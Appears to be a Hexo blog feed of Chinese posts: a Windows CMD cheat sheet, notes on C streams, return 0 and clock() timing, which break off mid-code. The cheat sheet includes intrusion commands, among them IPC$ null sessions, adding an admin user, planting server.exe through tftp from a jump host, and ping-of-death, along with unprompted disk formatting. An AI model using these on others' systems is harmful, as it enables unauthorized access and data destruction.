<li>wf.msc：高级安全Windows防火墙</li>
<li>WFS：Windows传真和扫描</li>
<li>wiaacmgr：扫描仪和照相机向导</li>
<li>winver：关于Windows</li>
<li>wmimgmt.msc：打开windows管理体系结构(WMI)</li>
<li>write：写字板</li>
<li>wscui.cpl：操作中心</li>
<li>wscript：windows脚本宿主设置</li>
<li>wuapp：Windows更新</li>
</ol>
<!-- more -->

<p>　　1. gpedit.msc—–组策略</p>
<p>　　2. sndrec32——-录音机</p>
<p>　　3. Nslookup——-IP地址侦测器 ，是一个 监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具。 它在 Windows NT&#x2F;2000&#x2F;XP 中均可使用 , 但在 Windows 98 中却没有集成这一个工具。</p>
<p>　　4. explorer——-打开资源管理器</p>
<p>　　5. logoff———注销命令</p>
<p>　　6. shutdown——-60秒倒计时关机命令</p>
<p>　　7. lusrmgr.msc—-本机用户和组</p>
<p>　　8. services.msc—本地服务设置</p>
<p>　　9. oobe&#x2F;msoobe &#x2F;a—-检查XP是否激活</p>
<p>　　10. notepad——–打开记事本</p>
<p>　　11. cleanmgr——-垃圾整理</p>
<p>　　12. net start messenger—-开始信使服务</p>
<p>　　13. compmgmt.msc—计算机管理</p>
<p>　　14. net stop messenger—–停止信使服务</p>
<p>　　15. conf———–启动netmeeting</p>
<p>　　16. dvdplay——–DVD播放器</p>
<p>　　17. charmap——–启动字符映射表</p>
<p>　　18. diskmgmt.msc—磁盘管理实用程序</p>
<p>　　19. calc———–启动计算器</p>
<p>　　20. dfrg.msc——-磁盘碎片整理程序</p>
<p>　　21. chkdsk.exe—–Chkdsk磁盘检查</p>
<p>　　22. devmgmt.msc— 设备管理器</p>
<p>　　23. regsvr32 &#x2F;u *.dll—-停止dll文件运行</p>
<p>　　24. drwtsn32—— 系统医生</p>
<p>　　25. rononce -p—-15秒关机</p>
<p>　　26. dxdiag———检查DirectX信息</p>
<p>　　27. regedt32——-注册表编辑器</p>
<p>　　28. Msconfig.exe—系统配置实用程序</p>
<p>　　29. rsop.msc——-组策略结果集</p>
<p>　　30. mem.exe——–显示内存使用情况</p>
<p>　　31. regedit.exe—-注册表</p>
<p>　　32. winchat——–XP自带局域网聊天</p>
<p>　　33. progman——–程序管理器</p>
<p>　　34. winmsd———系统信息</p>
<p>　　35. perfmon.msc—-计算机性能监测程序</p>
<p>　　36. winver———检查Windows版本</p>
<p>　　37. sfc &#x2F;scannow—–扫描错误并复原</p>
<p>　　38. <a href="https://www.zhihu.com/search?q=taskmgr&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22209115733%22%7D">taskmgr</a>—–任务管理器（2000&#x2F;xp&#x2F;2003</p>
<p>　　39. winver———检查Windows版本</p>
<p>　　40. wmimgmt.msc—-打开windows管理体系结构(WMI)</p>
<p>　　41. wupdmgr——–windows更新程序</p>
<p>　　42. wscript——–windows脚本宿主设置</p>
<p>　　43. write———-写字板</p>
<p>　　44. winmsd———系统信息</p>
<p>　　45. wiaacmgr——-扫描仪和照相机向导</p>
<p>　　46. winchat——–XP自带局域网聊天</p>
<p>　　47. mem.exe——–显示内存使用情况</p>
<p>　　48. Msconfig.exe—系统配置实用程序</p>
<p>　　49. mplayer2——-简易widnows media player</p>
<p>　　50. mspaint——–画图板</p>
<p>　　51. mstsc———-远程桌面连接</p>
<p>　　52. mplayer2——-媒体播放机</p>
<p>　　53. magnify——–放大镜实用程序</p>
<p>　　54. mmc————打开控制台</p>
<p>　　55. mobsync——–同步命令</p>
<p>　　56. dxdiag———检查DirectX信息</p>
<p>　　57. iexpress——-木马捆绑工具，系统自带 58. fsmgmt.msc—–共享文件夹管理器</p>
<p>　　58. utilman——–辅助工具管理器</p>
<p>　　59. diskmgmt.msc—磁盘管理实用程序</p>
<p>　　60. dcomcnfg——-打开系统组件服务</p>
<p>　　61. ddeshare——-打开DDE共享设置</p>
<p>　　62.  osk————打开屏幕键盘</p>
<p>　　63.  odbcad32——-ODBC数据源管理器</p>
<p>　　64.  oobe&#x2F;msoobe &#x2F;a—-检查XP是否激活 114. logoff———注销命令</p>
<p>　　65. notepad——–打开记事本</p>
<p>　　66. nslookup——-网络管理的工具向导</p>
<p>　　67. ntbackup——-系统备份和还原</p>
<p>　　68. narrator——-屏幕“讲述人”</p>
<p>　　69. ntmsmgr.msc—-移动存储管理器</p>
<p>　　70. ntmsoprq.msc—移动存储管理员操作请求</p>
<p>　　71. netstat -an—-(TC)命令检查接口</p>
<p>　　72. syncapp——–创建一个公文包</p>
<p>　　73. sysedit——–系统配置编辑器</p>
<p>　　74. sigverif——-文件签名验证程序</p>
<p>　　75. ciadv.msc——索引服务程序</p>
<p>　　76. shrpubw——–创建共享文件夹</p>
<p>　　77. secpol.msc—–本地安全策略</p>
<p>　　78. syskey———系统加密，一旦加密就不能解开，保护windows xp系统的双重密码</p>
<p>　　79. services.msc—本地服务设置</p>
<p>　　80. Sndvol32——-音量控制程序</p>
<p>　　81. sfc.exe——–系统文件检查器</p>
<p>　　82. sfc &#x2F;scannow—windows文件保护</p>
<p>　　83. ciadv.msc——索引服务程序</p>
<p>　　84. tourstart——xp简介（安装完成后出现的漫游xp程序）</p>
<p>　　86. taskmgr——–任务管理器</p>
<p>　　87. eventvwr——-事件查看器</p>
<p>　　88. eudcedit——-造字程序</p>
<p>　　89. compmgmt.msc—计算机管理</p>
<p>　　90. packager——-对象包装程序</p>
<p>　　91. perfmon.msc—-计算机性能监测程序</p>
<p>　　92. charmap——–启动字符映射表</p>
<p>　　93. cliconfg——-SQL SERVER 客户端网络实用程序</p>
<p>　　94. Clipbrd——–剪贴板查看器</p>
<p>　　95. conf———–启动<a href="https://www.zhihu.com/search?q=netmeeting&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22209115733%22%7D">netmeeting</a></p>
<p>　　96. certmgr.msc—-证书管理实用程序</p>
<p>　　97. regsvr32 &#x2F;u *.dll—-停止dll文件运行</p>
<p>　　98. regsvr32 &#x2F;u zipfldr.dll——取消ZIP支持</p>
<p>　　99. cmd.exe——–CMD命令提示符</p>
<p>　　100. chkdsk.exe—–Chkdsk磁盘检查</p>
<p>1.磁盘操作，<br>　　fdisk 隐含 参数 &#x2F;mbr 重建主引导记录fdisk &#x2F;mbr 重建主引导记录<br>　　fdisk 在DOS7.0以后增加了&#x2F;cmbr参数，可在挂接多个物理硬盘时，重建排序在后面的硬盘的主引导记录，例如：fdisk &#x2F;cmbr 2，可重写第二个硬盘的主引导记录。（在使用时要十分小心，避免把好的硬盘引导记录损坏）<br>　　format 参数： &#x2F;q 快速格式化 &#x2F;u 不可恢复 &#x2F;autotest 不提示 &#x2F;s 创建 MS-DOS 引导盘 format c: &#x2F;q &#x2F;u &#x2F;autotest<br>2.目录操作<br>　　DIR [目录名或文件名] [&#x2F;S][&#x2F;W][&#x2F;P][&#x2F;A] 列出目录 参数: &#x2F;s 查找子目录&#x2F;w 只显示文件名 &#x2F;p 分页&#x2F;a 显示隐藏文件 DIR format.exe &#x2F;s查找该盘的format.exe文件并报告位置<br>　　MD (MKDIR) [目录名] 创建目录 MKDIR HELLOWORLD 创建HELLOWORLD目录<br>　　CD (CHDIR) [目录名] PS:可以使用相对目录或绝对目录 进入目录 CD AA 进入当前文件夹下的AA目录,cd .. 进入上一个文件夹cd \返回根目录;cd c:\windows 进入c:\windows文件夹<br>　　RD ( RMDIR) [目录名] 删除目录 RD HELLOWORLD 删除HELLOWORLD目录<br>3.文件操作<br>　　删除目录及其文件： rmdir [目录名或文件名] [&#x2F;S][&#x2F;W][&#x2F;P][&#x2F;A] 。例 rmdir c:\qqdownload&#x2F;s 删除C盘的qqdownload目录。<br>　　del [目录名或文件名] [&#x2F;f][&#x2F;s][&#x2F;q] 删除 参数:&#x2F;f 删除只读文件&#x2F;s 删除该目录及其下的所有内容 &#x2F;q 删除前不确认<br>　　del c:\del &#x2F;s &#x2F;q 自动删除c盘的del目录。<br>　　copy [源文件或目录] [目标目录] 复制文件 copy d:\pwin98*.* c:\presetup 将d盘的pwin98的所有文件复制到c盘的presetup下。<br>　　attrib  [参数][源文件或目录]  文件属性操作命令，attrib命令可以列出或修改磁盘上文件的属性，文件属性包括文档（A）、只读(R)、隐藏(H)、系统(S)，例如：attrib  -h -r -s io.sys  执行这一命令后，将把DOS系统文件io.sys文件的只读、隐藏、系统属性去掉，这时将可以直接通过dir命令看到io.sys文件。attrib  +h +r +s autoexec.bat将为自动批处理文件增加以上属性。<br>4.内存操作<br>　　debug 调试内存 参数 -w [文件名] 写入二进制文件 -o [地址1] [地址2] 输出内存 -q 退出 exp:o 70 10[return] o 71 01<br>　　[return] 01[return] q[return] DOS下通过写70h&#x2F;71h PORT改变BIOS密码在CMOS中存放的对应位置的值,用以清除AWARD BIOS密码.debug 还可以破解硬盘保护卡等,但只可以在纯DOS下用。<br>5.分区操作<br>　　给磁盘分区，一般都会分成四个区，磁盘分区由主分区、扩展分区、逻辑分区组成。<br>　　PQ和Acronis  Disk  Director这两个工具都可以在不丢失数据的情况下对分区进行调整大小，以及合并等操作，XP系统的话你用PQ，WIN7系统的话用Acronis  Disk Director  操作基本一样，可以去网上找教程来看看，再不重装系统的情况下都能调整分区大小，但是建议你还是先备份下数据再调整，毕竟对硬盘直接进行的操作有一定的危险性。<br>　　net use ipipc$ “ “ &#x2F;user:” “ 建立IPC空链接</p>
<p>　　net use ipipc$ “密码” &#x2F;user:”用户名” 建立IPC非空链接</p>
<p>　　net use h: ipc$ “密码” &#x2F;user:”用户名” 直接登陆后映射对方C：到本地为H:</p>
<p>　　net use h: ipc$ 登陆后映射对方C：到本地为H:</p>
<p>　　net use ipipc$ &#x2F;del 删除IPC链接</p>
<p>　　net use h: &#x2F;del 删除映射对方到本地的为H:的映射</p>
<p>　　net user 用户名　密码　&#x2F;add 建立用户</p>
<p>　　net user guest &#x2F;active:yes 激活guest用户</p>
<p>　　net user 查看有哪些用户</p>
<p>　　net user 帐户名 查看帐户的属性</p>
<p>　　net localgroup administrators 用户名 &#x2F;add 把“用户”添加到管理员中使其具有管理员权限</p>
<p>　　net start 查看开启了哪些服务</p>
<p>　　net start 服务名　开启服务；(如:net start telnet， net start schedule)</p>
<p>　　net stop 服务名 停止某服务</p>
<p>　　net time 目标ip 查看对方时间</p>
<p>　　net time 目标ip &#x2F;set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数&#x2F;yes可取消确认信息</p>
<p>　　<a href="https://www.zhihu.com/search?q=net%20view&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22209115733%22%7D">net view</a> 查看本地局域网内开启了哪些共享</p>
<p>　　net view ip 查看对方局域网内开启了哪些共享</p>
<p>　　net config 显示系统网络设置</p>
<p>　　net logoff 断开连接的共享</p>
<p>　　net pause 服务名 暂停某服务</p>
<p>　　net send ip “文本信息” 向对方发信息</p>
<p>　　net ver 局域网内正在使用的网络连接类型和信息</p>
<p>　　net share 查看本地开启的共享</p>
<p>　　net share ipc$ 开启ipc$共享</p>
<p>　　net share ipc$ &#x2F;del 删除ipc$共享</p>
<p>　　net share c$ &#x2F;del 删除C：共享</p>
<p>　　net user guest 12345 用guest用户登陆后用将密码改为12345</p>
<p>　　net password 密码 更改系统登陆密码</p>
<p>　　netstat -a 查看开启了哪些端口,常用<a href="https://www.zhihu.com/search?q=netstat%20-an&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22209115733%22%7D">netstat -an</a></p>
<p>　　netstat -n 查看端口的网络连接情况，常用netstat -an</p>
<p>　　netstat -v 查看正在进行的工作</p>
<p>　　netstat -p 协议名 例：netstat -p tcq&#x2F;ip 查看某协议使用情况</p>
<p>　　netstat -s 查看正在使用的所有协议使用情况</p>
<p>　　nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名</p>
<p>　　tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。</p>
<p>　　ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。</p>
<p>　　ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)</p>
<p>　　ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“&#x2F;all”显示全部配置信息</p>
<p>　　tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support&#x2F;tools文件夹内)</p>
<p>　　kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support&#x2F;tools文件夹内)</p>
<p>　　del -F 文件名  加-F参数后就可删除只读文件,&#x2F;AR、&#x2F;AH、&#x2F;AS、&#x2F;AA分别表示删除只读、隐藏、系统、存档文件，&#x2F;A-R、&#x2F;A-H、&#x2F;A-S、&#x2F;A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL&#x2F;AR  *.*”表示删除当前目录下所有只读文件，“DEL&#x2F;A-S *.*”表示删除当前目录下除系统文件以外的所有文件</p>
<p>　　del &#x2F;S &#x2F;Q 目录 或用：rmdir &#x2F;s &#x2F;Q 目录 &#x2F;S删除目录及目录下的所有子目录和文件。同时使用参数&#x2F;Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）</p>
<p>　　move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数&#x2F;y将取消确认移动目录存在相同文件的提示就直接覆盖</p>
<p>　　fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，”&gt; “和”&gt; &gt;” 是重定向命令</p>
<p>　　at id号 开启已注册的某个计划任务</p>
<p>　　at &#x2F;delete 停止所有计划任务，用参数&#x2F;yes则不需要确认就直接停止</p>
<p>　　at id号 &#x2F;delete 停止某个已注册的计划任务</p>
<p>　　at 查看所有的计划任务</p>
<p>　　at ip time 程序名(或一个命令) &#x2F;r 在某时间运行对方某程序并重新启动计算机</p>
<p>　　finger username @host 查看最近有哪些用户登陆</p>
<p>　　telnet ip 端口 远和登陆服务器,默认端口为23</p>
<p>　　open ip 连接到IP（属telnet登陆后的命令）</p>
<p>　　telnet 在本机上直接键入telnet 将进入本机的telnet</p>
<p>　　copy 路径文件名1　路径文件名2 &#x2F;y 复制文件1到指定的目录为文件2，用参数&#x2F;y就同时取消确认你要改写一份现存目录文件</p>
<p>　　copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下</p>
<p>　　copy 1st.jpg&#x2F;b+2st.txt&#x2F;a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：&#x2F;b指二进制文件，&#x2F;a指ASCLL格式文件</p>
<p>　　copy ipadmin$svv.exe c: 或:copyipadmin$<em>.</em> 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：</p>
<p>　　xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数&#x2F;Y将不提示覆盖相同文件</p>
<p>　　用参数&#x2F;e才可连目录下的子目录一起复制到目标地址下。</p>
<p>　　tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exec:server.exe  登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i  则以ASCII模式（传送文本文件模式）进行传送</p>
<p>　　tftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机</p>
<p>　　ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)</p>
<p>　　route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface</p>
<p>　　arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息</p>
<p>　　start 程序名或命令 &#x2F;max 或&#x2F;min 新开一个新窗口并最大化（最小化）运行某程序或命令</p>
<p>　　mem 查看cpu使用情况</p>
<p>　　attrib 文件名(目录名) 查看某文件（目录）的属性</p>
<p>　　attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性</p>
<p>　　dir 查看文件，参数：&#x2F;Q显示文件及目录属系统哪个用户，&#x2F;T:C显示文件创建时间，&#x2F;T:A显示文件上次被访问时间，&#x2F;T:W上次被修改时间</p>
<p>　　date &#x2F;t 、 time &#x2F;t 使用此参数即“DATE&#x2F;T”、“TIME&#x2F;T”将只显示当前日期和时间，而不必输入新日期和时间</p>
<p>　　set 指定环境变量名称&#x3D;要指派给变量的字符 设置环境变量</p>
<p>　　set 显示当前所有的环境变量</p>
<p>　　set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量</p>
<p>　　pause 暂停批处理程序，并显示出：请按任意键继续….</p>
<p>　　if 在批处理程序中执行条件处理（更多说明见if命令及变量）</p>
<p>　　goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）</p>
<p>　　call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call &#x2F;?）</p>
<p>　　for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）</p>
<p>　　echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置</p>
<p>　　echo 信息 在屏幕上显示出信息</p>
<p>　　echo 信息 &gt;&gt; pass.txt 将”信息”保存到pass.txt文件中</p>
<p>　　findstr “Hello” aa.txt 在aa.txt文件中寻找字符串hello</p>
<p>　　find 文件名 查找某文件</p>
<p>　　title 标题名字 更改CMD窗口标题名字</p>
<p>　　color 颜色值 设置cmd控制台前景和背景颜色；0&#x3D;黑、1&#x3D;蓝、2&#x3D;绿、3&#x3D;浅绿、4&#x3D;红、5&#x3D;紫、6&#x3D;黄、7&#x3D;白、8&#x3D;灰、9&#x3D;淡蓝、A&#x3D;淡绿、B&#x3D;淡浅绿、C&#x3D;淡红、D&#x3D;淡紫、E&#x3D;淡黄、F&#x3D;亮白</p>
<p>　　prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )</p>
<p>　　ver 在DOS窗口下显示版本信息</p>
<p>　　winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）</p>
<p>　　format 盘符 &#x2F;FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: &#x2F;FS:NTFS</p>
<p>　　md　目录名 创建目录</p>
<p>　　replace 源文件　要替换文件的目录 替换文件</p>
<p>　　ren 原文件名　新文件名 重命名文件名</p>
<p>　　tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称</p>
<p>　　type 文件名 显示文本文件的内容</p>
<p>　　more 文件名 逐屏显示输出文件</p>
<p>　　doskey 要锁定的命令&#x3D;字符</p>
<p>　　doskey 要解锁命令&#x3D; 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir&#x3D;entsky (不能用doskey dir&#x3D;dir)；解锁：doskey dir&#x3D;</p>
<p>　　taskmgr 调出任务管理器</p>
<p>　　chkdsk &#x2F;F D: 检查磁盘D并显示状态报告；加参数&#x2F;f并修复磁盘上的错误</p>
<p>　　tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口</p>
<p>　　exit 退出cmd.exe程序或目前，用参数&#x2F;B则是退出当前批处理脚本而不是cmd.exe</p>
<p>　　path 路径可执行文件的文件名 为可执行文件设置一个路径。</p>
<p>　　cmd 启动一个win2K命令解释窗口。参数：&#x2F;eff、&#x2F;en 关闭、开启命令扩展；更我详细说明见cmd &#x2F;?</p>
<p>　　regedit &#x2F;s 注册表文件名 导入注册表；参数&#x2F;S指安静模式导入，无任何提示；</p>
<p>　　regedit &#x2F;e 注册表文件名 导出注册表</p>
<p>　　cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：&#x2F;D 用户名:设定拒绝某用户访问；&#x2F;P  用户名:perm 替换指定用户的访问权限；&#x2F;G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C  更改(写入)，F 完全控制；例：cacls D: est.txt &#x2F;D pub 设定d: est.txt拒绝pub用户访问。</p>
<p>　　cacls 文件名 查看文件的访问用户权限列表</p>
<p>　　REM 文本内容 在批处理文件中添加注解</p>
<p>　　netsh 查看或更改本地网络配置情况</p>
]]></content>
      <tags>
        <tag>快捷键</tag>
      </tags>
  </entry>
  <entry>
    <title>liu</title>
    <url>/2023/03/03/liu/</url>
    <content><![CDATA[<h1 id="主要介绍："><a href="#主要介绍：" class="headerlink" title="主要介绍："></a>主要介绍：</h1><p>  什么是“流”，“流”的基本概念，“流”对于内存和外部设备着<span id="more"></span>什么样的作用，C语言默认打开的三个“流”：stdin、stdout、stderr👀。</p>
<!-- more -->

<p>通过《C语言》文件这一章的学习，我们学会了如何向文件进行读写操作，也就是如何让数据从内存中保存到硬盘上，或是如何从硬盘上读取数据放到内存中。硬盘其实是一个外部设备，那有人就要问了：我们能否对其他<strong>外部</strong>设进行读写操作呢？例如：屏幕、键盘、鼠标、U盘、光盘、网络…… ，答案当然是肯定的。</p>
<h2 id="但值得注意"><a href="#但值得注意" class="headerlink" title="但值得注意"></a>但值得注意</h2><p> 的是，<em>每一种外部设备的读写方式是有所差异的</em>，就比如：写硬盘和写屏幕，读键盘和读网络。那大家想一下，如果一个程序员写代码的时候，必须要把每种外部设备的读和写的方式都理解透彻，是不是太麻烦了！</p>
<p>  所以，为了能够<em>让程序员更加方便的对外部设备进行读写操作</em>，我们会在外部设备前抽象出来一层东西，称为：“流”的概念。这样程序员在写文件的时候就不需要关注外部设备了，只需要将数据写到“流”里面去，然后由C语言底层的封装来进行相应的操作，把“流”里面的数据分发到不同的外部设备当中去。反之亦是如此。 如下图所示。抽象的来说“流”就相当于一个中转站，能够将数据更具不同的外部设备读写的方式来进行相应的操作。 如此这些外部设备的细节就不需要用户来关注，用户只需要关注“流”就可以了（这里的“流”指的是向哪个外部设备进行的操作）。至于“流”是如何做到向不同外部设备读写的，这是在C语言底层就已经实现好的，不需要我们关心。<br>  所以，为了能够让程序员更加方便的对外部设备进行读写操作，我们会<em>在外部设备前抽象出来一层东西</em>，称为：“<strong>流</strong>”的概念。这样程序员在写文件的时候就不需要关注外部设备了，只需要将数据写到“流”里面去，然后由<strong>C语言底层的封装</strong>来进行相应的操作，把“流”里面的数据分发到不同的外部设备当中去。反之亦是如此。 如下图所示。抽象的来说“流”就相当于一个<strong>中转站</strong>，能够将数据更具不同的外部设备读写的方式来进行相应的操作。 如此这些外部设备的细节就不需要用户来关注，用户只需要关注“流”就可以了（这里的“流”指的是向哪个外部设备进行的操作）。至于“流”是如何做到向不同外部设备读写的，这是在C语言底层就已经实现好的，不需要我们关心。<br>  “流”是一个比较抽象的概念，数据就像水管里的水流，可以从内存中流向外部设备，也可以从外部设备流向内存，但只能<strong>单方向</strong>的流。由此可见“流”是有明确的方向性的，所以可以将“流”分为两种：以内存为第一人称，<strong>数据从内存向外流的称为输出流，数据由外向内存流的称为输入流</strong>。</p>
<p>  还值得补充的一点是，不知道大家有没有发现，我们在对一个文件操作前必须先打开它，获得与之关联的文件指针，这个指针就可以称为“文件流”，因为这个指针指向了数据的目的地 &#x2F; 源头。但我们在对屏幕写出数据时或从键盘上读入数据时，并没有对这些外部设备进行打开操作获得所对应的“流”啊，而且在scanf和printf操作的时候也没有要求你给出数据的流向，最后却还能实现，这是为什么呢？<br>因为任意一个C程序只要运行起来，就会默认打开3个“流”：</p>
<blockquote>
<p>stdin —— 标准输入流（键盘）</br><br>stdout —— 标准输出流（屏幕）</br><br>stderr —— 标准错误流（屏幕）</br></p>
</blockquote>
<p>  所以printf()会默认将数据发送到stdout这个“流”上，scanf()会默从stdin这个“流”上读取数据，不需要我们手动打开和关闭“流”。但对于文件来说，我们就必须先打开这个文件从而获得这个“流”，然后才能从这个“流”里面读取数据或向这个“流”里面写数据，最后还得关闭“流”。<br>  那有同学就要问了：能不能用格式化输出函数fprintf()来向屏幕上输出一段内容？答案当然是可以的.</p>
]]></content>
      <tags>
        <tag>IO</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2023/01/27/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you <span id="more"></span>can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<!-- more -->
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
 <!-- more -->
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
      <tags>
        <tag>Hello World</tag>
      </tags>
  </entry>
  <entry>
    <title>return 0</title>
    <url>/2023/03/05/return%200/</url>
    <content><![CDATA[<p>C语言为什么要return 0(个人看法)</p>
<span id="more"></span>

<p>c语言中的return 0有什么用?<br>用return这种形式就能定义返回值, return 0可以 终止 main() 函数，并返回值 0。<br>return 0 代表程序正常退出，return 1代表程序异常退出！<br>使用return 语句可以返回一个变量内的值或一个指针，也可用return0，表示返回为空。<br>return 代表调到函数外，<br><strong>return 0代表函数正常终止</strong><br><strong>return 1代表函数非正常终止</strong><br>而我觉得还有一个作用就是return之后你至少知道代码成功运行到最后一行，中间没有异常中止，并且return 关键字的还有一个作用是返回程序流程的控制权！其副作用是返回一个值。</p>
]]></content>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>clock</title>
    <url>/2023/03/01/clock/</url>
    <content><![CDATA[<h1 id="clock"><a href="#clock" class="headerlink" title="clock"></a>clock</h1><p>C语言中的函数clock（ ），它可以捕捉从程序开始运行到clock(<span id="more"></span> )被调用时所耗费的时间。它计时所用的单位是clock tick，翻译成中文就是“时钟打点”。</p>
<!-- more -->
<p>与之配套的还有一个常数CLK_TCK，实际上就是“clock tick”的缩写。它给出的是机器时钟每秒所走的时钟打点数。这个数在不同机器中可能不一样，可以通过写程序得到一台机器的CLK_TCK。</p>
<p>代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">( )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, CLK_TCK);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>将clock( )函数和常数CLK_TCK两个配合在一起，就可以计算出来一个函数到底跑了多少秒钟。</p>
<p>以下是一个常用的模板：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;studio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="comment">/*要用clock( )函数必须要包含time.h*/</span></span><br><span class="line"><span class="type">clock_t</span> start,stop;<span class="comment">/*clock_t是clock( )函数返回的变量类型*/</span></span><br><span class="line"><span class="type">double</span> duration;<span class="comment">/*记录被测函数运行时间，以秒为单位*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">( )</span></span><br><span class="line">&#123;   <span class="comment">/*不在测试范围内的准备工作写在clock( )调用之前*/</span></span><br><span class="line">    start=clock();<span class="comment">/*开始计时*/</span></span><br><span class="line">    MyFunction();<span class="comment">/*把被测函数加在这里*/</span></span><br><span class="line">    stop=clock();<span class="comment">/*停止计时*/</span></span><br><span class="line">    duration=((<span class="type">double</span>)(stop-start))/CLK_TCK;<span class="comment">/*计算运行时间*/</span></span><br><span class="line">    <span class="comment">/*其他不在测试范围的处理写在后面，例如输出duration的值*/</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 